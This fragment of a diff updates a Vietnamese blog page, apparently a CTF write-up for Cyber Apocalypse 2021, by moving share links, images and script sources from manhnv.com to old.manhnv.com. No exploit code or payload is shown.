+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fold.manhnv.com%2Fpost%2Fctf%2Fcyber-apocalypse-2021%2Fmisc%2Fcyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup%2F" aria-label="Chia sẻ với Facebook">
           <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Chia sẻ với Facebook</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fmanhnv.com%2Fpost%2Fctf%2Fcyber-apocalypse-2021%2Fmisc%2Fcyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup%2F" aria-label="Chia sẻ với Twitter">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fold.manhnv.com%2Fpost%2Fctf%2Fcyber-apocalypse-2021%2Fmisc%2Fcyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup%2F" aria-label="Chia sẻ với Twitter">
           <i class="fab fa-twitter" aria-hidden="true"></i><span>Chia sẻ với Twitter</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fmanhnv.com%2Fpost%2Fctf%2Fcyber-apocalypse-2021%2Fmisc%2Fcyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup%2F" aria-label="Chia sẻ với Linkedin">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fold.manhnv.com%2Fpost%2Fctf%2Fcyber-apocalypse-2021%2Fmisc%2Fcyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup%2F" aria-label="Chia sẻ với Linkedin">
           <i class="fab fa-linkedin" aria-hidden="true"></i><span>Chia sẻ với Linkedin</span>
         </a>
       </li>
@@ -692,7 +692,7 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
       <i class="fa fa-times"></i>
     </div>
     
-      <img id="about-card-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+      <img id="about-card-picture" src="https://old.manhnv.com/favicon.png" alt="Ảnh đại diện" />
     
     <h4 id="about-card-name">Manh NV</h4>
     
@@ -720,7 +720,7 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
     
   
     
-      <div id="cover" style="background-image:url('https://manhnv.com/images/cover-v1.2.0.jpg');"></div>
+      <div id="cover" style="background-image:url('https://old.manhnv.com/images/cover-v1.2.0.jpg');"></div>
     
   
 
@@ -733,11 +733,11 @@ Dưới đây là POC mình viết, nó nhìn thì ngu như nó work nhé các b
 <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
 
-<script src="https://manhnv.com/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+<script src="https://old.manhnv.com/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
 
 
   
-    <script src="https://manhnv.com/js/scripts.js"></script>
+    <script src="https://old.manhnv.com/js/scripts.js"></script>
   
 
   
